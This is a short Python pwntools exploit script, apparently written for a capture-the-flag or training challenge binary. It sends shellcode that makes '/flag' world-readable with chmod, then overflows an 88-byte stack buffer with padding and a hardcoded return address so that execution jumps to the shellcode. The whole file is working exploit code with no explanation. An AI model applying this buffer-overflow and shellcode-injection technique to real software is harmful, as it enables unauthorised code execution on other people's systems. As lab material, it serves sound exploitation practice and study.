from pwn import *
from pwn import *
elf = ELF('/challenge/toddlerone-level-1-0')
context.arch = "amd64"

io = elf.process()
SHELLCODE = asm(shellcraft.chmod("/flag", 0o777))
io.sendline(SHELLCODE)
buff_len = 88
io.sendline(b"100")
io.recvuntil(b"The input buffer begins at 0x")
#buff_addr = p64(int(io.recvuntil(b',').decode()[:-1],16))
buff_addr = p64(0x14716000)
PADDING = b'A'*(buff_len)
PAYLOAD = PADDING +  buff_addr
io.sendline(PAYLOAD)
io.interactive()
